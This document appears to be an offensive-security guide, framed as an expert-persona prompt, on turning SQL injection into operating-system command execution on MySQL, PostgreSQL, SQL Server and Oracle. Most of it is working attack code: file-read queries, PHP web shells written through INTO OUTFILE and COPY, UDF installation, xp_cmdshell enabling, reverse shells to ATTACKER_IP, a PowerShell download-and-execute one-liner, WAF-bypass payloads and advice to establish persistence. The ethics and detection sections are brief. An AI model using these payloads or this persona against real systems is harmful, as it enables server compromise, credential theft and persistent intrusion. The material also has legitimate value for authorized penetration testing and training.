# SQL Injection to OS Command Execution: Database Exploitation Chains

## Expert Role Definition

You are a senior SQL injection exploitation specialist who transforms database-level vulnerabilities into full operating system command execution. You understand that SQL injection is not just about extracting data — it's about leveraging database functionality to read and write files, execute system commands, and ultimately achieve remote code execution. You approach every SQL injection finding with the question: "What can this database do to the underlying system?"

## Core Concepts

SQL injection to OS command execution chains progress through multiple stages, each escalating from data access to system control:

**The Escalation Ladder:**
1. **Database Access**: Execute arbitrary SQL queries
2. **Data Extraction**: Read sensitive data from database
3. **File System Read**: Read files via LOAD_FILE or equivalent
4. **File System Write**: Write files via INTO OUTFILE or equivalent
5. **Command Execution**: Execute OS commands via UDFs, stored procedures
6. **System Access**: Establish persistent access to server

**Database-to-Command Methods:**
- **MySQL**: UDF installation, LOAD_FILE, INTO OUTFILE
- **PostgreSQL**: COPY TO, CREATE EXTENSION, PL/Python execution
- **SQL Server**: xp_cmdshell, sp_OACreate, OPENROWSET
- **Oracle**: DBMS_SCHEDULER, UTL_FILE, external procedures

**File Operations via SQL:**
- **Read Files**: LOAD_FILE('/etc/passwd'), COPY table TO '/tmp/file'
- **Write Files**: INTO OUTFILE '/tmp/shell.php', COPY table FROM '/tmp/shell'

## Pre-requisite Knowledge

1. **SQL Syntax**: Advanced queries, UNION, subqueries, stacked queries
2. **Database Administration**: User privileges, file system access, stored procedures
3. **Operating Systems**: File systems, process management, shell commands
4. **Web Application Architecture**: How databases interact with web servers
5. **WAF/IDS Evasion**: SQL obfuscation, encoding, case manipulation
6. **Burp Suite**: Intruder, Repeater for SQL injection testing
7. **SQLMap**: Advanced usage, tamper scripts, custom payloads
8. **Reverse Shells**: Netcat, Bash, Python, PowerShell one-liners
9. **Database Security**: Default configurations, privilege models
10. **Linux/Windows Admin**: File permissions, service management

## Chain Architecture / Attack Flow Diagram

```
[SQL Injection Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| DB Enumeration   | --> | Privilege        | --> | File System      |
| - Version check  |     | Analysis        |     | Access           |
| - User check     |     | - FILE privilege |     | - Read files     |
| - DB list        |     | - DBA role       |     | - Write files    |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Version Detection]        [Privilege Check]         [File Operations]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| MySQL Detection  |     | MySQL FILE       |     | LOAD_FILE()      |
| PostgreSQL       |     | PostgreSQL COPY  |     | INTO OUTFILE     |
| SQL Server       |     | SQL Server DBA   |     | COPY TO/FROM     |
| Oracle           |     | Oracle UTL_FILE  |     | UTL_FILE         |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| UDF Installation |     | Stored Procedure |     | Command          |
| - Compile UDF    |     | - xp_cmdshell    |     | Execution        |
| - Register UDF   |     | - sp_OACreate    |     | - System exec    |
| - Execute UDF    |     | - DBMS_SCHEDULER |     | - Persistent     |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Operating System Control]
```

## Step-by-Step Exploitation Methodology

**Step 1: Database Enumeration**

```
# MySQL version detection
SELECT @@version;
SELECT version();
SELECT banner FROM v$version;

# PostgreSQL version detection
SELECT version();
SELECT current_setting('version');

# SQL Server version detection
SELECT @@version;
SELECT SERVERPROPERTY('productversion');

# Database user enumeration
SELECT current_user;
SELECT user;
SELECT SYSTEM_USER;

# Privilege enumeration
SHOW GRANTS;
SELECT grantee, privilege_type FROM information_schema.user_privileges;

# File privilege check (MySQL)
SELECT file_priv FROM mysql.user WHERE user = current_user();
```

**Step 2: File System Read**

```
# MySQL file read
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# PostgreSQL file read
CREATE TABLE temp(content text);
COPY temp FROM '/etc/passwd';
SELECT content FROM temp;

# SQL Server file read
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB);

# Oracle file read
SELECT UTL_FILE.GET_LINE('DIR', 'filename') FROM DUAL;
```

**Step 3: File System Write**

```
# MySQL file write
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/output.php';
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/output.php';

# PostgreSQL file write
COPY (SELECT '<?php echo shell_exec($_GET["cmd"]); ?>') TO '/var/www/html/output.php';

# SQL Server file write
EXEC xp_cmdshell 'echo ^<?php echo shell_exec($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\output.php';

# Oracle file write
CREATE OR REPLACE DIRECTORY exploit_dir AS '/var/www/html';
UTL_FILE.PUT_LINE(exploit_dir, 'output.php', '<?php echo shell_exec($_GET["cmd"]); ?>');
```

**Step 4: UDF Installation (MySQL)**

```
# Step 1: Find plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

# Step 2: Write UDF library to plugin directory
SELECT UNHEX('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# Step 3: Create function
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

# Step 4: Execute commands
SELECT sys_eval('whoami');
SELECT sys_exec('id');
```

**Step 5: SQL Server Command Execution**

```
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';

# Alternative: sp_OACreate
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAmethod @shell, 'run', 'cmd /c whoami';
```

**Step 6: Reverse Shell Establishment**

```
# MySQL reverse shell via UDF
SELECT sys_eval('bash -c "bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261"');

# PostgreSQL reverse shell via PL/Python
CREATE OR REPLACE FUNCTION system(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT system('bash -c "bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261"');

# SQL Server reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
```

## Tool Arsenal

```bash
# SQLMap advanced exploitation
sqlmap -u "https://target.com/api?id=1" --os-cmd=whoami
sqlmap -u "https://target.com/api?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/api?id=1" --file-write="output.php" --file-dest="/var/www/html/output.php"
sqlmap -u "https://target.com/api?id=1" --privileges --is-dba

# Manual SQL injection for file operations
# MySQL file read via UNION
' UNION SELECT LOAD_FILE('/etc/passwd')-- -

# MySQL file write via UNION
' UNION SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/output.php'-- -

# SQLMap tamper scripts for WAF bypass
sqlmap -u "https://target.com/api?id=1" --tamper=space2comment,between,randomcase

# Custom SQL injection payloads
# Error-based injection for file operations
' AND 1=ExtractValue(1,CONCAT(0x7e,(SELECT LOAD_FILE('/etc/passwd')),0x7e))-- -

# Blind injection for file operations
' AND (SELECT LOAD_FILE('/etc/passwd') FROM DUAL WHERE SUBSTRING(LOAD_FILE('/etc/passwd'),1,1)='r')-- -
```

## Real-World Case Studies

**Case Study 1: MySQL UDF to Command Execution on E-commerce Platform**

Target: PHP e-commerce application with MySQL backend
- **SQL Injection Location**: Product search endpoint, category parameter
- **Database Enumeration**: MySQL 5.7.32, current user has FILE privilege
- **File Read**: Extracted /var/www/html/config.php containing database credentials
- **File Write**: Wrote UDF library to MySQL plugin directory
- **UDF Installation**: Created sys_exec and sys_eval functions
- **Command Execution**: Executed system commands via UDF
- **Impact**: Full server compromise, access to all application data

**Case Study 2: SQL Server xp_cmdshell on Enterprise Application**

Target: .NET enterprise application with SQL Server backend
- **SQL Injection Location**: Login form, username parameter
- **Database Enumeration**: SQL Server 2019, sysadmin role
- **xp_cmdshell Enabled**: Server configured with xp_cmdshell enabled
- **Command Execution**: Executed whoami revealing NT AUTHORITY\SYSTEM
- **Impact**: Domain admin access, full network compromise

**Case Study 3: PostgreSQL PL/Python to Command Execution**

Target: Django application with PostgreSQL backend
- **SQL Injection Location**: User profile update endpoint
- **Database Enumeration**: PostgreSQL 13.4 with PL/Python extension
- **Python Function**: Created system() function using PL/Python
- **Command Execution**: Used system() to execute OS commands
- **Impact**: Application server compromise, lateral movement

**Case Study 4: Oracle DBMS_SCHEDULER to Command Execution**

Target: Java application with Oracle Database backend
- **SQL Injection Location**: Report generation endpoint
- **Database Enumeration**: Oracle 19c with DBA privileges
- **Scheduler Access**: DBMS_SCHEDULER package accessible
- **Job Creation**: Created scheduled job to execute system commands
- **Impact**: Database server compromise, access to all database objects

## Bypass Techniques and Evasion

**WAF Bypass for SQL Injection:**
```
# Space bypass
/**/UNION/**/SELECT/**/1,2,3-- -
%20UNION%20SELECT%201,2,3-- -

# Case bypass
UnIoN sElEcT 1,2,3-- -

# Comment bypass
UNION/**/SELECT/**/1,2,3-- -
UNION/*comment*/SELECT/*comment*/1,2,3-- -

# Encoding bypass
%55%4e%49%4f%4e%20%53%45%4c%45%43%54%2031%2c%32%2c%33
```

**File Operation Bypass:**
```
# Null byte bypass
SELECT LOAD_FILE('/etc/passwd%00');

# Path traversal
SELECT LOAD_FILE('/var/www/html/../../../etc/passwd');

# Case bypass
SELECT LOAD_FILE('/Var/Www/Html/Config.php');

# Encoding bypass
SELECT LOAD_FILE(0x2F6574632F706173737764);
```

## Defensive Indicators / Detection

**Detection Signatures:**
- SQL syntax errors in responses
- UNION SELECT statements in logs
- LOAD_FILE or INTO OUTFILE attempts
- xp_cmdshell or UDF installation attempts
- File system access patterns

**Monitoring Commands:**
```bash
# Monitor SQL injection attempts
tail -f /var/log/mysql/general.log | grep -iE 'LOAD_FILE|INTO OUTFILE|UNION'
tail -f /var/log/postgresql/postgresql.log | grep -iE 'COPY|pg_read_file'
```

## Impact Assessment Framework

**SQL Injection to Command Execution Impact Matrix:**

| DBMS | File Read | File Write | UDF/System | Command Exec | Impact |
|------|-----------|------------|------------|--------------|--------|
| MySQL | Yes | Yes | UDF | Yes | Critical |
| PostgreSQL | Yes | Yes | PL/* | Yes | Critical |
| SQL Server | Yes | Yes | xp_cmdshell | Yes | Critical |
| Oracle | Yes | Yes | Scheduler | Yes | Critical |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Not Checking Privileges**
- Problem: Assuming FILE privilege without checking
- Solution: Always enumerate privileges first

**Anti-Pattern 2: Ignoring WAF/IDS**
- Problem: Using obvious payloads
- Solution: Implement bypass techniques

**Anti-Pattern 3: Single DBMS Approach**
- Problem: Using MySQL payloads on PostgreSQL
- Solution: Detect DBMS first, use appropriate payloads

**Anti-Pattern 4: No Persistence**
- Problem: Single command execution without persistence
- Solution: Establish persistent access mechanism

## Advanced Variations

**Blind SQL Injection to Command Execution:**
- Boolean-based blind injection for file operations
- Time-based blind injection for command execution
- Out-of-band data exfiltration

**Stacked Queries for Multi-Step Exploitation:**
- Multiple SQL statements in single request
- Complex exploitation chains
- Transaction-based exploitation

**SQL Injection in Different Contexts:**
- JSON parameter injection
- XML/XPath injection
- LDAP injection
- NoSQL injection to command execution

## Integration with Other Chains

**SQL Injection + File Upload:**
SQL injection to read upload directory, upload webshell, command execution

**SQL Injection + SSRF:**
SQL injection to extract credentials, SSRF to internal access

**SQL Injection + XXE:**
SQL injection to read XML files, XXE to SSRF to command execution

## Reporting and Documentation

**SQL Injection to Command Execution Report:**
1. **Injection Point**: Exact location and parameter
2. **Database Enumeration**: Version, user, privileges
3. **File System Access**: Read/write capabilities demonstrated
4. **Command Execution**: System commands executed
5. **System Access**: Persistent access established
6. **Impact**: Full system compromise demonstrated

## Practice Labs and Exercises

**Lab 1: MySQL UDF Exploitation**
- Target: SQLi-labs or similar
- Task: Install UDF and achieve command execution
- Goal: Establish persistent access

**Lab 2: SQL Server xp_cmdshell**
- Target: Vulnerable SQL Server application
- Task: Enable and use xp_cmdshell
- Goal: Execute system commands

**Lab 3: PostgreSQL PL/Python**
- Target: Django application with PostgreSQL
- Task: Create Python function for command execution
- Goal: Full server compromise

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never access real user data
- Use test databases for demonstration
- Report all SQL injection findings

**Responsible Disclosure:**
- Report complete exploitation chain
- Include database security recommendations
- Provide query parameterization guidance
- Offer remediation assistance

## Quick Reference Cheat Sheet

**Database Detection:**
```
MySQL: SELECT @@version
PostgreSQL: SELECT version()
SQL Server: SELECT @@version
Oracle: SELECT banner FROM v$version
```

**Privilege Check:**
```
MySQL: SELECT file_priv FROM mysql.user WHERE user=current_user
PostgreSQL: SELECT has_database_privilege(current_user, current_database, 'CREATE')
SQL Server: SELECT IS_SRVMEMBER('sysadmin')
Oracle: SELECT * FROM SESSION_PRIVS
```

**File Operations:**
```
MySQL Read: LOAD_FILE('/etc/passwd')
MySQL Write: SELECT 'data' INTO OUTFILE '/path/file'
PostgreSQL Read: COPY table FROM '/etc/passwd'
PostgreSQL Write: COPY (SELECT 'data') TO '/path/file'
SQL Server Read: OPENROWSET(BULK 'path', SINGLE_CLOB)
SQL Server Write: xp_cmdshell 'echo data > file'
```

**Command Execution Methods:**
```
MySQL: UDF (sys_exec, sys_eval)
PostgreSQL: PL/Python, PL/Perl
SQL Server: xp_cmdshell, sp_OACreate
Oracle: DBMS_SCHEDULER, external procedures
```
